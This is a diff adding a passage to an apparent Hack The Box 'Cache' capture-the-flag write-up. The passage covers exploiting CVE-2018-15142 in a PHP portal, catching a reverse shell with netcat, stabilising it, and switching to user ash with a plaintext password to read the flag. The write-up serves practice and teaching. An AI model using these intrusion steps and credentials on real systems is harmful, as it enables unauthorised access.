@@ -204,3 +204,56 @@ xxxxxx           (?)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
+
+Using CVE-2018-15142, we realize that we can execute arbitary PHP code from the vulnerable ```/portal/import_template``` endpoint. We will first create a POC for this vulnerable endpoint. Visitng ```/portal/payload.php```, we notice that we can see the PHP page, which shows that the exploit has succeeded.
+
+![POC for RCE](https://github.com/joelczk/writeups/blob/main/HTB/Images/cache/rce_poc.PNG)
+
+Now, what we have to do is to craft a single line url-encoded PHP payload that uploads a reverse shell to the vulnerable website. We will then trigger the payload by visiting ```/portal/exploit.php```
+
+![RCE reverse shell](https://github.com/joelczk/writeups/blob/main/HTB/Images/cache/rce_reverse_shell.PNG)
+
+Next, we will first stabilize the shell on our attacking machine.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 3000
+listening on [any] 3000 ...
+connect to [10.10.16.250] from (UNKNOWN) [10.10.10.188] 52156
+bash: cannot set terminal process group (1603): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@cache:/var/www/hms.htb/public_html/portal$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+<al$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@cache:/var/www/hms.htb/public_html/portal$ export TERM=xterm
+export TERM=xterm
+www-data@cache:/var/www/hms.htb/public_html/portal$ stty cols 132 rows 34
+stty cols 132 rows 34
+www-data@cache:/var/www/hms.htb/public_html/portal$ 
+```
+
+## Obtaining user flag
+However, we realize that we do not have the appropriate permissions to obtain the user flag.
+
+```
+www-data@cache:/$ cd /home/ash
+cd /home/ash
+www-data@cache:/home/ash$ ls
+ls
+Desktop  Documents  Downloads  Music  Pictures  Public  user.txt
+www-data@cache:/home/ash$ cat user.txt
+cat user.txt
+cat: user.txt: Permission denied
+www-data@cache:/home/ash$ 
+```
+
+Recalling that we have obtained the credentials for the user ```ash``` previously, we will switch the user to ```ash``` using the credentials. Afterwards, we will be able to obtain the user flag
+```
+www-data@cache:/home/ash$ su ash
+su ash
+Password: H@v3_fun
+
+ash@cache:~$ cat user.txt
+cat user.txt
+<Redacted user flag>
+ash@cache:~$
+```
